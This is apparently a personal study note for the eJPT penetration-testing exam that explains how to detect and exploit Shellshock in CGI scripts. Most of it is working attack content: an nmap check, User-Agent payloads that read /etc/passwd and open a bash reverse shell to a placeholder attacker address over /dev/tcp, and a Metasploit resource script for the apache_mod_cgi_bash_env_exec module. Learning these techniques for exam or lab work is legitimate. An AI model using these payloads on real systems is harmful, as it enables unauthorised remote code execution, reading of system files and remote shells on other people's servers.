[[eJPT EXAM/Vulnerability Analysis/Shellshock]]
To verify if the target is vulnerable to Shellshock, we can use Metasploit. We’ll begin by utilizing an auxiliary module designed to check for this vulnerability. The module we’ll use is: `scanner/http/apache_mod_cgi_bash_env`
#### Shellshock
1. to check if it is vulnerable to shellshock or NOT !
	-> first, find a `.cgi` script in web 
	-> `nmap <Target_IP> -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi`
	
2. Execution : 
	-> User-Agent : ` () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`

Take reverse_shell
` () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/attacker_ip/8080 0>&1' `


1. MSF Exploit :
	-> `apache_mod_cgi_bash_env_exec`

Exploit:
Upon running the check, we find that the website is indeed vulnerable to the Shellshock exploit. Now, let’s proceed by exploiting this vulnerability using another Metasploit module: `exploit/multi/http/apache_mod_cgi_bash_env_exec`

save file exploit_shellshock.rc
```rc
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set rhosts <target_ip>
set targeturi /gettime.cgi
exploit
```

